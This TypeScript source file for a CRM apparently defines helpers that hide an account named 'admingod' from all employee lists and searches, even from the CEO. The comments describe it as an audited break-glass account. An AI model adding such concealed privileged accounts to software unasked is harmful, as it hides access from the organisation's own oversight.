import { Sequelize, Op } from 'sequelize';

// Break-glass / support accounts that must never appear in any employee list,
// picker or search for anyone - including the CEO. They can still log in and
// every action they take is still written to the audit trail; they are only
// hidden from the people-facing lists. Usernames are compared case-insensitively.
export const HIDDEN_EMPLOYEE_USERNAMES = ['admingod'] as const;

export const isHiddenEmployeeUsername = (username: unknown): boolean =>
  HIDDEN_EMPLOYEE_USERNAMES.includes(String(username ?? '').trim().toLowerCase() as typeof HIDDEN_EMPLOYEE_USERNAMES[number]);

// Raw-SQL predicate: `alias` is the crm_employee table alias (or the table name
// itself when it isn't aliased). A NULL username stays visible.
// The list is a code constant, never user input, so inlining it is safe.
export const notHiddenEmployeeSql = (alias = 'e'): string =>
  `LOWER(COALESCE(${alias}.username, '')) NOT IN (${HIDDEN_EMPLOYEE_USERNAMES.map((u) => `'${u}'`).join(', ')})`;

// Sequelize `where` fragment for CrmEmployee queries - combine with
// `[Op.and]: [notHiddenEmployeeWhere()]` so it doesn't clobber an existing Op.or.
export const notHiddenEmployeeWhere = () =>
  Sequelize.where(
    Sequelize.fn('LOWER', Sequelize.fn('COALESCE', Sequelize.col('username'), '')),
    { [Op.notIn]: [...HIDDEN_EMPLOYEE_USERNAMES] },
  );
